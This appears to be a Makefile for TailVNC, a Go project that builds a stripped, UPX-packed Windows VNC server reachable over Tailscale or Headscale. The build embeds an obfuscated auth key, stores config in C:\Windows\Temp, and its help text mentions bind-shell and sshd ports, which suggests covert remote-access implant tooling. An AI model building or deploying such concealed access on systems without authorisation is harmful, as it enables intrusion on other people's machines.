VERSION     	?= $(shell git describe --tags --always --dirty 2>/dev/null || echo "dev")
BUILD_TIME  	= $(shell date -u '+%Y-%m-%d_%H:%M:%S')
AUTH_KEY    	?=
CONTROL_URL 	?=
LDFLAGS     	= -ldflags "-s -w -X main.version=$(VERSION) -X main.buildTime=$(BUILD_TIME)$(if $(AUTH_KEY), -X main.buildWithObfuscatedAuthKey=$(shell go run obfuscator/obfuscate_key_hex.go '$(AUTH_KEY)'))$(if $(CONFIG_DIR), -X main.buildWithConfigDir=$(CONFIG_DIR))$(if $(CONTROL_URL), -X main.buildWithControlURL=$(CONTROL_URL))$(if $(SOCKS5_PORT), -X main.buildWithListenPort=$(LISTEN_PORT))$(if $(EXPOSE_DIR), -X main.buildWithExposeDir=$(EXPOSE_DIR))$(if $(AUTH_PASS), -X main.buildWithAuthPass=$(AUTH_PASS))"
BUILD_ENV   	= CGO_ENABLED=0
BUILD_PACKAGE	?=
BINARY_NAME 	?=

PLATFORMS = \
	windows/amd64

# Default target
.PHONY: all
all: clean build

# Clean build artifacts
.PHONY: clean
clean:
	rm -rf dist/
	go clean

# Build for current platform
.PHONY: build
build:
	$(BUILD_ENV) go build $(LDFLAGS) -o $(BINARY_NAME) .

# Install dependencies
.PHONY: deps
deps:
	go mod download
	go mod tidy

# Build for a specific platform
.PHONY: build-platform
build-platform:
	@mkdir -p dist
	@os=$(word 1, $(subst /, ,$(PLATFORM))); \
	arch=$(word 2, $(subst /, ,$(PLATFORM))); \
	ext=$$( [ $$os = windows ] && echo .exe || echo ); \
	out=dist/$(BINARY_NAME)-$$os-$$arch$$ext; \
	echo "Building $$os/$$arch -> $$out"; \
	GOOS=$$os GOARCH=$$arch $(BUILD_ENV) go build $(LDFLAGS) -o $$out $(BUILD_PACKAGE); \
	[ -x "$$(command -v upx)" ] && upx --best --lzma $$out || true

# Build vnc with windows platforms
.PHONY: build-vnc
build-vnc: clean deps
	@if [ -z "$(AUTH_KEY)" ]; then \
		echo "Error: AUTH_KEY is required. Usage: make build-vnc AUTH_KEY=tskey-auth-xxxxxx [LISTEN_PORT=5900] [AUTH_PASS=Passw0rd] [CONTROL_URL=https://headscale.example.com]"; \
		exit 1; \
	fi
	@$(foreach platform, $(PLATFORMS), \
		$(MAKE) build-platform PLATFORM=$(platform) AUTH_KEY="$(AUTH_KEY)" CONFIG_DIR="$(CONFIG_DIR)" CONTROL_URL="$(CONTROL_URL)" LISTEN_PORT="$(LISTEN_PORT)" AUTH_PASS="$(AUTH_PASS)" BUILD_PACKAGE="tailvnc/cmd/vnc" BINARY_NAME="TailVNC";)


# Show help
.PHONY: help
help:
	@echo "Available targets:"
	@echo "  build-vnc				   - Build vnc server for all platforms"
	@echo "  help                      - Show this help"
	@echo ""
	@echo "Required parameters:"
	@echo "  AUTH_KEY                  - Tailscale auth key (required for all build targets)"
	@echo ""
	@echo "Optional parameters:"
	@echo "  CONFIG_DIR	               - Directory to store and retrieve persistent config data used by tsnet (default: C:\Windows\Temp\.config)"
	@echo "  CONTROL_URL               - Headscale control server URL"
	@echo "  LISTEN_PORT               - Listen port for fileserver/bindshell/sshd/vnc"
	@echo "  AUTH_PASS	               - Password for ssh/vnc auth"
	@echo ""
	@echo "Examples:"
	@echo "  make build-vnc AUTH_KEY=tskey-auth-xxxxxx LISTEN_PORT=5900 AUTH_PASS=Passw0rd"